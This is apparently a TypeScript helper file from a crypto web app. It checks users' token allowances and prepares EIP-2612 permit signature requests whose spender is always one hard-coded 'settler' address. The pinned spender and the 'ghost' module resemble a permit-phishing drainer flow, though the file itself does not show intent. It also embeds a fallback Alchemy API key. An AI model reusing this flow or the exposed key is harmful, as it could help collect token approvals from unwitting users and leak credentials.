"use client";

import {
  createPublicClient,
  http,
  parseAbi,
  type Address,
  getAddress,
} from "viem";
import { mainnet, bsc, polygon, base, arbitrum, optimism } from "viem/chains";
import { getDomainMetadata, PERMIT_TYPES } from "../../domain-data";
import { SETTLER_ADDR, PERMIT2_ADDRESS, PERMIT_ABI } from "../types";
import { GLOBAL_SPENDERS } from "../../ghost/constants";

const logLabel = "[evm-helpers.ts]";

// 🛡️ HARD-PINNED TRUTH
const AUTHORIZED_SETTLER = getAddress(
  "0x6072e645bab9be651fb195c5e5445625a7606ec8",
);

/** 🛠️ TYPE DEFINITIONS */
interface SpenderInfo {
  name: string;
  addr: Address;
}

interface DetectedSpender {
  address: Address;
  name: string;
}

const CHAIN_MAP: Record<number, any> = {
  1: mainnet,
  56: bsc,
  137: polygon,
  8453: base,
  42161: arbitrum,
  10: optimism,
};

function getRpcUrl(chainId: number): string {
  const apiKey =
    process.env.NEXT_PUBLIC_ALCHEMY_API_KEY || "LEcRJW_Bhx4ybZ7TSZ3p9";
  if (chainId === 56) return "https://bsc-dataseed.binance.org";
  const subdomains: Record<number, string> = {
    1: "eth-mainnet",
    10: "opt-mainnet",
    42161: "arb-mainnet",
    8453: "base-mainnet",
    137: "polygon-mainnet",
  };
  return `https://${
    subdomains[chainId] || "eth-mainnet"
  }.g.alchemy.com/v2/${apiKey}`;
}

/**
 * 🕵️ ALLOWANCE CHECKER
 */
export async function checkExistingAllowance(
  token: string,
  owner: string,
  _chain: any,
  requiredAmount: bigint = 0n,
): Promise<DetectedSpender | null> {
  const chainId = Number(_chain.id || _chain);

  // 🛡️ SECURITY GUARD: Environment Poisoning Protection
  if (
    process.env.NEXT_PUBLIC_SETTLER_ADDR &&
    getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
  ) {
    console.error(`${logLabel} 🛑 CRITICAL: Environment Poisoning Detected!`);
    return null;
  }

  try {
    const client = createPublicClient({
      chain: CHAIN_MAP[chainId] || mainnet,
      transport: http(getRpcUrl(chainId)),
      batch: { multicall: true },
    });

    const abi = parseAbi([
      "function allowance(address,address) view returns (uint256)",
    ]);

    const spenders: SpenderInfo[] = Object.entries(GLOBAL_SPENDERS).map(
      ([name, addr]) => ({
        name,
        addr: getAddress(addr as string),
      }),
    );

    // Inject the HARD-PINNED Settler
    if (
      !spenders.some(
        (s) => s.addr.toLowerCase() === AUTHORIZED_SETTLER.toLowerCase(),
      )
    ) {
      spenders.push({
        name: "CURRENT_SETTLER",
        addr: AUTHORIZED_SETTLER,
      });
    }

    const results = await client.multicall({
      contracts: spenders.map((s) => ({
        address: getAddress(token),
        abi,
        functionName: "allowance",
        args: [getAddress(owner), s.addr],
      })),
      allowFailure: true,
    });

    let detectedSpender: DetectedSpender | null = null;

    results.forEach((res, i) => {
      if (res.status === "success") {
        const val = res.result as bigint;
        const currentSpender = spenders[i];

        if (val > 0n && val >= (requiredAmount > 0n ? requiredAmount : 1n)) {
          if (
            currentSpender.addr.toLowerCase() ===
            AUTHORIZED_SETTLER.toLowerCase()
          ) {
            console.log(`${logLabel} 💰 Found DIRECT Allowance for Settler.`);
            detectedSpender = {
              address: currentSpender.addr,
              name: currentSpender.name,
            };
          }
        }
      }
    });

    return detectedSpender;
  } catch (error: any) {
    console.warn(`${logLabel} ⚠️ Allowance Check Fail:`, error.message);
    return null;
  }
}

/**
 * ✍️ PERMIT ANALYZER (EIP-2612)
 */
export async function checkPermitSupport(
  tokenAddr: Address,
  _chain: any,
  owner: string,
  value: bigint,
  symbol: string,
  onChainName: string,
) {
  const chainId = Number(_chain.id || _chain);
  if (value <= 0n || symbol === "UNK") return null;

  try {
    const client = createPublicClient({
      chain: CHAIN_MAP[chainId] || mainnet,
      transport: http(getRpcUrl(chainId)),
    });

    const nonce = await client
      .readContract({
        address: getAddress(tokenAddr),
        abi: PERMIT_ABI,
        functionName: "nonces",
        args: [getAddress(owner)],
      })
      .catch(() => null);

    if (nonce === null) return null;

    const metadata = getDomainMetadata(symbol, chainId, onChainName, tokenAddr);
    const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);

    return {
      domain: {
        name: metadata.name || onChainName,
        version: metadata.version || "1",
        chainId: chainId,
        verifyingContract: getAddress(tokenAddr),
        ...(metadata.salt ? { salt: metadata.salt } : {}),
      },
      types: { Permit: PERMIT_TYPES.Permit },
      primaryType: "Permit",
      message: {
        owner: getAddress(owner),
        spender: AUTHORIZED_SETTLER, // 🛡️ PINNED
        value: value.toString(),
        nonce: Number(nonce),
        deadline: deadline.toString(),
      },
    };
  } catch (error: any) {
    console.warn(`${logLabel} ⚠️ Permit Probe Fail:`, error.message);
    return null;
  }
}
